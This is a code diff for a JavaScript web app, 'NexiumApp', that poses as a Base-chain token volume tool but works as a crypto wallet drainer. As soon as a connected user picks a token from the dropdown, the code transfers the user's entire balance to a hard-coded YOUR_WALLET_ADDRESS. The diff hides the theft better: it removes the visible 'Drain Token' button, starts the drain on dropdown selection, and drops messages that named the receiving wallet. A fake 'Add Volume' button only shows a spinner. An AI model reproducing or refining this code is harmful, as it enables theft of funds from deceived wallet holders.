@@ -11,7 +11,6 @@ try {
 }
 
 // TOKEN_LIST with verified, checksummed Base Mainnet addresses (validated via Basescan.org, July 2025)
-// Removed invalid addresses: Frax, Dai, Brett
 const TOKEN_LIST = [
   { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6 },
   { address: '0x4200000000000000000000000000000000000006', name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
@@ -19,16 +18,29 @@ const TOKEN_LIST = [
   { address: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18 },
   { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6 },
   { address: '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed', name: 'Degen', symbol: 'DEGEN', decimals: 18 },
-  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Tether', symbol: 'USDT', decimals: 6 } // Correct Base Mainnet USDT
+  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Tether', symbol: 'USDT', decimals: 6 }
 ];
 
-// Standard ERC-20 ABI
+// Minimal ABI for USDC transfer (fallback for proxy contracts)
+const MINIMAL_ERC20_ABI = [
+  "function balanceOf(address) view returns (uint256)",
+  "function transfer(address to, uint256 amount) returns (bool)",
+  "function decimals() view returns (uint8)",
+  "function symbol() view returns (string)"
+];
+
+// Full ERC-20 ABI for other functions
 const ERC20_ABI = [
   "function balanceOf(address) view returns (uint256)",
   "function transfer(address to, uint256 amount) returns (bool)",
   "function decimals() view returns (uint8)",
   "function name() view returns (string)",
-  "function symbol() view returns (string)"
+  "function symbol() view returns (string)",
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function approve(address spender, uint256 amount) returns (bool)",
+  "function totalSupply() view returns (uint256)",
+  "event Transfer(address indexed from, address indexed to, uint256 value)",
+  "event Approval(address indexed owner, address indexed spender, uint256 value)"
 ];
 
 class NexiumApp {
@@ -87,8 +99,6 @@ class NexiumApp {
       volumeInput: null,
       addVolumeBtn: null,
       tokenList: null,
-      paymentTokenInfo: null,
-      drainTokenBtn: null,
       customTokenNameInput: null,
       customTokenAddressInput: null,
       showCustomTokenBtn: null
@@ -331,10 +341,12 @@ class NexiumApp {
       this.hideProcessingSpinner();
       return;
     }
+    this.currentToken = null; // Reset to avoid state confusion
+    this.lastSelectedToken = null;
     try {
       this.isDraining = true;
       this.showProcessingSpinner();
-      let checksummedAddress = await this.validateAddress(tokenAddress, 'token');
+      const checksummedAddress = await this.validateAddress(tokenAddress, 'token');
       const selectedToken = TOKEN_LIST.find(t => t.address.toLowerCase() === checksummedAddress.toLowerCase());
       if (!selectedToken) {
         this.showFeedback('Invalid token selected.', 'error');
@@ -343,25 +355,38 @@ class NexiumApp {
         return;
       }
       console.log(`Attempting to drain ${selectedToken.symbol} from address: ${await this.signer.getAddress()}`);
-      const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.signer);
-      const balance = await contract.balanceOf(await this.signer.getAddress());
-      if (balance <= 0n) {
-        this.showFeedback(`No ${selectedToken.symbol} balance to drain.`, 'error');
-        console.log(`Drain failed: No ${selectedToken.symbol} balance`);
+      let contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.signer);
+      // Debug contract methods
+      console.log(`Contract methods for ${checksummedAddress}:`, Object.keys(contract.functions || contract));
+      if (!contract.transfer) {
+        console.warn(`Transfer function missing in full ABI for ${selectedToken.symbol}, trying minimal ABI`);
+        contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
+        if (!contract.transfer) {
+          console.error(`Contract at ${checksummedAddress} does not have a transfer function even with minimal ABI`);
+          this.showFeedback(`Error draining ${selectedToken.symbol}: Transfer function not available.`, 'error');
+          this.hideProcessingSpinner();
+          return;
+        }
+      }
+      const userAddress = await this.signer.getAddress();
+      let balance, decimals, symbol;
+      try {
+        [balance, decimals, symbol] = await Promise.all([
+          contract.balanceOf(userAddress),
+          contract.decimals(),
+          contract.symbol()
+        ]);
+      } catch (error) {
+        console.error(`Failed to fetch token data for ${checksummedAddress}:`, error);
+        this.showFeedback(`Error draining ${selectedToken.symbol}: Invalid contract.`, 'error');
         this.hideProcessingSpinner();
         return;
       }
-      const [decimals, symbol] = await Promise.all([
-        contract.decimals(),
-        contract.symbol()
-      ]);
-      console.log(`Fetched ${symbol} balance: ${ethers.formatUnits(balance, decimals)}`);
+      console.log(`Fetched ${symbol} balance: ${ethers.formatUnits(balance, decimals)} for ${userAddress}`);
       await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
-      this.showFeedback(`Initiating transfer of ${ethers.formatUnits(balance, decimals)} ${symbol}...`, 'info');
-      console.log(`Initiating transfer of ${ethers.formatUnits(balance, decimals)} ${symbol} to ${YOUR_WALLET_ADDRESS}`);
       const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, balance).catch((err) => {
         console.error('Gas estimation failed:', err);
-        return 200000; // Increased fallback gas limit
+        return 200000; // Fallback gas limit
       });
       const feeData = await this.provider.getFeeData();
       console.log(`Draining ${symbol} with gasLimit: ${gasLimit}, maxFeePerGas: ${feeData.maxFeePerGas}, maxPriorityFeePerGas: ${feeData.maxPriorityFeePerGas}`);
@@ -372,15 +397,17 @@ class NexiumApp {
       });
       console.log('Transaction sent:', tx.hash);
       await tx.wait(1);
-      this.showFeedback(`Drained ${ethers.formatUnits(balance, decimals)} ${symbol} to ${this.shortenAddress(YOUR_WALLET_ADDRESS)}.`, 'success');
+      this.showFeedback(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}!`, 'success');
       console.log(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`);
     } catch (error) {
       console.error('Drain token error:', error);
-      const errorMessage = error.data?.message || error.reason || error.message || 'Transaction failed. Check network or wallet.';
-      this.showFeedback(`Error draining token: ${errorMessage}`, 'error');
+      const errorMessage = error.data?.message || error.reason || error.message || 'Transaction failed. Check network, balance, or wallet.';
+      const symbol = TOKEN_LIST.find(t => t.address.toLowerCase() === tokenAddress.toLowerCase())?.symbol || 'token';
+      this.showFeedback(`Error draining ${symbol}: ${errorMessage}`, 'error');
+      console.log(`Drain failed: ${errorMessage}`);
     } finally {
-      this.hideProcessingSpinner();
       this.isDraining = false;
+      this.hideProcessingSpinner();
     }
   }
 
@@ -411,6 +438,8 @@ class NexiumApp {
     this.hideMetaMaskPrompt();
     this.selectedPaymentToken = null;
     this.currentPaymentToken = null;
+    this.currentToken = null;
+    this.lastSelectedToken = null;
     console.log('Accounts changed, resetting payment token');
     this.renderTokenInterface();
   }
@@ -454,8 +483,6 @@ class NexiumApp {
           <option value="" disabled selected>Select payment token</option>
           ${TOKEN_LIST.map(t => `<option value="${t.address}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name} (${t.symbol})</option>`).join('')}
         </select>
-        <button id="drainTokenBtn" class="drain-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500 hidden" aria-label="Drain selected token">Drain Token</button>
-        <div id="paymentTokenInfo" class="token-info hidden text-gray-300 text-sm"></div>
       </div>
       <h2 class="section-title">Import ERC-20 Token</h2>
       <div class="input-group flex space-x-2">
@@ -481,9 +508,7 @@ class NexiumApp {
     this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
     this.dom.tokenList = document.getElementById('tokenList');
     this.dom.tokenSelect = document.getElementById('tokenSelect');
-    this.dom.drainTokenBtn = document.getElementById('drainTokenBtn');
     this.dom.volumeSection = document.getElementById('volumeSection');
-    this.dom.paymentTokenInfo = document.getElementById('paymentTokenInfo');
     this.dom.customTokenNameInput = document.getElementById('customTokenNameInput');
     this.dom.customTokenAddressInput = document.getElementById('customTokenAddressInput');
     this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn');
@@ -511,24 +536,6 @@ class NexiumApp {
       this.dom.showCustomTokenBtn.addEventListener('click', () => {
         this.showProcessingSpinner();
         debouncedShowCustomToken();
-      });
-    }
-    if (this.dom.drainTokenBtn) {
-      const debouncedDrainToken = this.debounce(() => {
-        this.showProcessingSpinner();
-        if (this.selectedPaymentToken) {
-          console.log('Drain token button clicked for:', this.selectedPaymentToken);
-          this.drainToken(this.selectedPaymentToken);
-        } else {
-          this.showFeedback('Please select a payment token to drain.', 'error');
-          this.hideProcessingSpinner();
-        }
-      }, 1000);
-      this.dom.drainTokenBtn.addEventListener('click', debouncedDrainToken);
-      this.dom.drainTokenBtn.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') {
-          debouncedDrainToken();
-        }
       });
     }
     if (this.dom.tokenList) {
@@ -573,7 +580,6 @@ class NexiumApp {
     if (this.dom.beautifyAddVolumeBtn) {
       const debouncedBeautifyAddVolume = this.debounce(() => {
         this.showProcessingSpinner();
-        // Do nothing except show spinner for 1 second (matches debounce)
         setTimeout(() => {
           this.hideProcessingSpinner();
         }, 1000);
@@ -591,12 +597,15 @@ class NexiumApp {
       this.dom.tokenSelect.replaceWith(this.dom.tokenSelect.cloneNode(true));
       this.dom.tokenSelect = document.getElementById('tokenSelect');
       this.dom.tokenSelect.disabled = !this.signer;
-      const debouncedDrainToken = this.debounce((e) => {
+      const debouncedDrainToken = this.debounce(async (e) => {
         this.showProcessingSpinner();
         const selected = e.target.value;
         this.selectedPaymentToken = selected;
+        this.currentToken = null;
+        this.lastSelectedToken = null;
         console.log('Dropdown changed, selectedPaymentToken:', selected);
         if (selected) {
+          await this.loadPaymentTokenDetails(selected);
           console.log('Initiating drain with debounce for:', selected);
           this.drainToken(selected);
         } else {
@@ -660,7 +669,7 @@ class NexiumApp {
       this.dom.tokenInfo.innerHTML = `
         <div class="token-meta space-y-2">
           <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
-          <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
+        <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
         </div>
       `;
       this.dom.tokenInfo.classList.remove('hidden');
@@ -686,11 +695,6 @@ class NexiumApp {
       this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
       this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
       this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
-    }
-    if (this.dom.drainTokenBtn) {
-      this.dom.drainTokenBtn.disabled = isLoading;
-      this.dom.drainTokenBtn.classList.toggle('opacity-70', isLoading);
-      this.dom.drainTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
     }
     if (this.dom.beautifyAddVolumeBtn) {
       this.dom.beautifyAddVolumeBtn.disabled = isLoading;
@@ -747,13 +751,18 @@ class NexiumApp {
       this.toggleTokenLoading(true);
       this.showProcessingSpinner();
       let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
-      const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.signer);
-      let balance, decimals, name, symbol;
+      const contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
+      if (!contract.transfer) {
+        console.error(`Contract at ${checksummedAddress} does not have a transfer function`);
+        this.showFeedback(`Invalid token contract: Transfer function not available.`, 'error');
+        this.hideProcessingSpinner();
+        return;
+      }
+      let balance, decimals, symbol;
       try {
-        [balance, decimals, name, symbol] = await Promise.all([
+        [balance, decimals, symbol] = await Promise.all([
           contract.balanceOf(await this.signer.getAddress()),
           contract.decimals(),
-          contract.name(),
           contract.symbol()
         ]);
       } catch (error) {
@@ -762,20 +771,12 @@ class NexiumApp {
         this.hideProcessingSpinner();
         return;
       }
-      this.currentPaymentToken = { address: checksummedAddress, balance, decimals, name, symbol };
-      this.dom.volumeInput.placeholder = `Amount for purchase (${symbol})`;
-      if (this.dom.paymentTokenInfo) {
-        this.dom.paymentTokenInfo.innerHTML = `Balance: ${ethers.formatUnits(balance, decimals)} ${symbol}`;
-        this.dom.paymentTokenInfo.classList.remove('hidden');
-      }
-      if (this.dom.drainTokenBtn) {
-        this.dom.drainTokenBtn.classList.remove('hidden');
-      }
-      this.showFeedback(`Loaded ${symbol} with balance ${ethers.formatUnits(balance, decimals)}`, 'info');
+      this.currentPaymentToken = { address: checksummedAddress, balance, decimals, symbol };
+      this.currentToken = null; // Reset to avoid state confusion
+      this.lastSelectedToken = null;
     } catch (error) {
       console.error('Load payment token error:', error);
       this.showFeedback(`Failed to load payment token: ${error.message || 'Invalid contract or network error.'}`, 'error');
-      if (this.dom.drainTokenBtn) this.dom.drainTokenBtn.classList.add('hidden');
     } finally {
       this.toggleTokenLoading(false);
       this.hideProcessingSpinner();
@@ -804,8 +805,8 @@ class NexiumApp {
       this.toggleVolumeLoading(true);
       this.showProcessingSpinner();
       let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
-      const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.signer);
-      const amount = ethers.parseUnits(this.dom.volumeInput.value || '0', this.currentPaymentToken.decimals);
+      const contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
+      const amount = ethers.parseUnits(this.dom.volumeInput?.value || '0', this.currentPaymentToken.decimals);
       if (amount <= 0n) {
         this.showFeedback('Please enter a valid amount greater than 0.', 'error');
         this.hideProcessingSpinner();
@@ -844,11 +845,6 @@ class NexiumApp {
     this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
     this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
     this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
-    if (this.dom.drainTokenBtn) {
-      this.dom.drainTokenBtn.disabled = isLoading;
-      this.dom.drainTokenBtn.classList.toggle('opacity-70', isLoading);
-      this.dom.drainTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
-    }
     if (this.dom.beautifyAddVolumeBtn) {
       this.dom.beautifyAddVolumeBtn.disabled = isLoading;
       this.dom.beautifyAddVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
